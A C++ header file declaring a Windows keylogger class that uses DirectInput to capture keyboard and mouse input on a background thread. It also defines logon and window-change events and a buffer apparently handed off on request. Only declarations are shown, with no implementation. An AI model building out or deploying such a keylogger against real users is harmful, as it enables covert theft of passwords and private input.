#ifndef _H_KEYLOGGER_
#define _H_KEYLOGGER_

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define DIRECTINPUT_VERSION 0x0800

#include <windows.h>
#include <stdio.h>
#include <string>
#include <dinput.h>
#include <time.h>
#include <io.h>

using namespace std;

#define FLUSH_INTERVAL			30 // in seconds

#define KEY_BUFFER_SIZE		0x100
#define MOUSE_BUFFER_SIZE	0x100

#define LOGGER_EVENT_KEYUP		252
#define LOGGER_EVENT_MOUSE1		253
#define LOGGER_EVENT_MOUSE2		254
#define LOGGER_EVENT_LOGON		255
#define LOGGER_EVENT_WINDOW		0

class KeyLogger
{
private:

	LPDIRECTINPUT8       directInput;

	LPDIRECTINPUTDEVICE8 keyboard;
	LPDIRECTINPUTDEVICE8 mouse;

	HANDLE keyLoggerThread;

	bool shuttingDown;

public:

	bool dataRequested;
	bool dataCompleted;
	bool dataError;

	HANDLE dataReady;

	unsigned char *data;
	long int       dataSize;

	int KeyLoggerCore();
	int StartKeyLogger();

	int Shutdown();
};

int StartKeyLoggerCore(void *_myKeyLogger);

#endif